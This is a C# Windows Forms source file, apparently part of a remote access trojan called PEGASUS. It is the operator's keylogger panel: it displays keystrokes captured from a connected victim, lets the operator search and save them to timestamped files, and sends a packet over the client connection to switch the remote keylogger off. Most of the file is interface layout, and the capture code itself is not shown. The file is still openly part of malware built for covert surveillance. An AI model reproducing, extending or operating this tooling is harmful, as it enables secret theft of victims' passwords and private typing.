using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Connection;
using PEGASUS.MessagePack;

namespace PEGASUS.Forms
	{
public class FormKeylogger : Form
{
	public StringBuilder Sb = new StringBuilder();

	private IContainer components;

	private ToolStrip toolStrip1;

	private ToolStripLabel toolStripLabel1;

	private ToolStripTextBox toolStripTextBox1;

	private ToolStripSeparator toolStripSeparator1;

	private ToolStripButton toolStripButton1;

	public RichTextBox richTextBox1;

	public System.Windows.Forms.Timer timer1;

	private Guna2Panel guna2Panel1;

	private Guna2PictureBox guna2PictureBox1;

	private PictureBox pictureBox1;

	private Label label1;

	private Guna2Separator guna2Separator1;

	private Guna2BorderlessForm guna2BorderlessForm1;

	private Guna2ShadowForm guna2ShadowForm1;

	public PEGASUSMain F { get; set; }

	internal Clients Client { get; set; }

	public string FullPath { get; set; }

	public FormKeylogger()
	{
		InitializeComponent();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
	{
		Sb?.Clear();
		if (Client != null)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Logger";
				msgPack.ForcePathObject("isON").AsString = "false";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			});
		}
	}

	private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		richTextBox1.SelectionStart = 0;
		richTextBox1.SelectAll();
		richTextBox1.SelectionBackColor = Color.White;
		if (e.KeyData != Keys.Return || string.IsNullOrWhiteSpace(toolStripTextBox1.Text))
		{
			return;
		}
		int num;
		for (int i = 0; i < richTextBox1.TextLength; i += num + toolStripTextBox1.Text.Length)
		{
			num = richTextBox1.Find(toolStripTextBox1.Text, i, RichTextBoxFinds.None);
			if (num != -1)
			{
				richTextBox1.SelectionStart = num;
				richTextBox1.SelectionLength = toolStripTextBox1.Text.Length;
				richTextBox1.SelectionBackColor = Color.Yellow;
				continue;
			}
			break;
		}
	}

	private void ToolStripButton1_Click(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			File.WriteAllText(FullPath + "\\Keylogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", richTextBox1.Text.Replace("\n", Environment.NewLine));
		}
		catch
		{
		}
	}

	private void guna2PictureBox1_Click(object sender, EventArgs e)
	{
		Close();
	}

	[DllImport("user32.DLL")]
	private static extern void ReleaseCapture();

	[DllImport("user32.DLL")]
	private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

	private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
	{
		ReleaseCapture();
		SendMessage(base.Handle, 274, 61458, 0);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormKeylogger));
		timer1 = new System.Windows.Forms.Timer(components);
		toolStrip1 = new System.Windows.Forms.ToolStrip();
		toolStripLabel1 = new System.Windows.Forms.ToolStripLabel();
		toolStripTextBox1 = new System.Windows.Forms.ToolStripTextBox();
		toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
		toolStripButton1 = new System.Windows.Forms.ToolStripButton();
		richTextBox1 = new System.Windows.Forms.RichTextBox();
		guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
		guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
		label1 = new System.Windows.Forms.Label();
		pictureBox1 = new System.Windows.Forms.PictureBox();
		guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
		guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
		guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
		toolStrip1.SuspendLayout();
		guna2Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
		SuspendLayout();
		timer1.Interval = 1000;
		timer1.Tick += new System.EventHandler(Timer1_Tick);
		toolStrip1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		toolStrip1.Dock = System.Windows.Forms.DockStyle.Bottom;
		toolStrip1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		toolStrip1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		toolStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		toolStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { toolStripLabel1, toolStripTextBox1, toolStripSeparator1, toolStripButton1 });
		toolStrip1.Location = new System.Drawing.Point(0, 484);
		toolStrip1.Name = "toolStrip1";
		toolStrip1.Size = new System.Drawing.Size(700, 25);
		toolStrip1.TabIndex = 0;
		toolStrip1.Text = "toolStrip1";
		toolStripLabel1.Name = "toolStripLabel1";
		toolStripLabel1.Size = new System.Drawing.Size(46, 22);
		toolStripLabel1.Text = "Search";
		toolStripTextBox1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		toolStripTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		toolStripTextBox1.Font = new System.Drawing.Font("Electrolize", 9f);
		toolStripTextBox1.ForeColor = System.Drawing.Color.LightGray;
		toolStripTextBox1.Name = "toolStripTextBox1";
		toolStripTextBox1.Size = new System.Drawing.Size(68, 25);
		toolStripTextBox1.Text = "...";
		toolStripTextBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(ToolStripTextBox1_KeyDown);
		toolStripSeparator1.ForeColor = System.Drawing.Color.DimGray;
		toolStripSeparator1.Name = "toolStripSeparator1";
		toolStripSeparator1.Size = new System.Drawing.Size(6, 25);
		toolStripButton1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
		toolStripButton1.Image = (System.Drawing.Image)resources.GetObject("toolStripButton1.Image");
		toolStripButton1.ImageTransparentColor = System.Drawing.Color.Magenta;
		toolStripButton1.Name = "toolStripButton1";
		toolStripButton1.Size = new System.Drawing.Size(39, 22);
		toolStripButton1.Text = "Save";
		toolStripButton1.Click += new System.EventHandler(ToolStripButton1_Click);
		richTextBox1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		richTextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		richTextBox1.Font = new System.Drawing.Font("Electrolize", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		richTextBox1.ForeColor = System.Drawing.Color.LightGray;
		richTextBox1.Location = new System.Drawing.Point(0, 67);
		richTextBox1.Margin = new System.Windows.Forms.Padding(2);
		richTextBox1.Name = "richTextBox1";
		richTextBox1.ReadOnly = true;
		richTextBox1.Size = new System.Drawing.Size(700, 417);
		richTextBox1.TabIndex = 1;
		richTextBox1.Text = "";
		guna2Panel1.Controls.Add(guna2Separator1);
		guna2Panel1.Controls.Add(label1);
		guna2Panel1.Controls.Add(pictureBox1);
		guna2Panel1.Controls.Add(guna2PictureBox1);
		guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		guna2Panel1.Location = new System.Drawing.Point(0, 0);
		guna2Panel1.Name = "guna2Panel1";
		guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
		guna2Panel1.Size = new System.Drawing.Size(700, 67);
		guna2Panel1.TabIndex = 2;
		guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
		guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		guna2Separator1.BackColor = System.Drawing.Color.Transparent;
		guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Separator1.Location = new System.Drawing.Point(-299, 61);
		guna2Separator1.Name = "guna2Separator1";
		guna2Separator1.Size = new System.Drawing.Size(1299, 10);
		guna2Separator1.TabIndex = 13;
		guna2Separator1.UseTransparentBackground = true;
		label1.AutoSize = true;
		label1.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		label1.Location = new System.Drawing.Point(285, 20);
		label1.Name = "label1";
		label1.Size = new System.Drawing.Size(86, 19);
		label1.TabIndex = 12;
		label1.Text = "KEYLOGS";
		pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
		pictureBox1.Location = new System.Drawing.Point(12, 12);
		pictureBox1.Name = "pictureBox1";
		pictureBox1.Size = new System.Drawing.Size(40, 42);
		pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		pictureBox1.TabIndex = 10;
		pictureBox1.TabStop = false;
		guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
		guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
		guna2PictureBox1.ImageRotate = 0f;
		guna2PictureBox1.Location = new System.Drawing.Point(659, 12);
		guna2PictureBox1.Name = "guna2PictureBox1";
		guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
		guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
		guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		guna2PictureBox1.TabIndex = 6;
		guna2PictureBox1.TabStop = false;
		guna2PictureBox1.UseTransparentBackground = true;
		guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
		guna2BorderlessForm1.ContainerControl = this;
		guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ShadowForm1.TargetForm = this;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		base.ClientSize = new System.Drawing.Size(700, 509);
		base.Controls.Add(richTextBox1);
		base.Controls.Add(guna2Panel1);
		base.Controls.Add(toolStrip1);
		ForeColor = System.Drawing.Color.LightGray;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.Name = "FormKeylogger";
		Text = "Keylogger";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Keylogger_FormClosed);
		toolStrip1.ResumeLayout(false);
		toolStrip1.PerformLayout();
		guna2Panel1.ResumeLayout(false);
		guna2Panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
		ResumeLayout(false);
		PerformLayout();
	}
}
}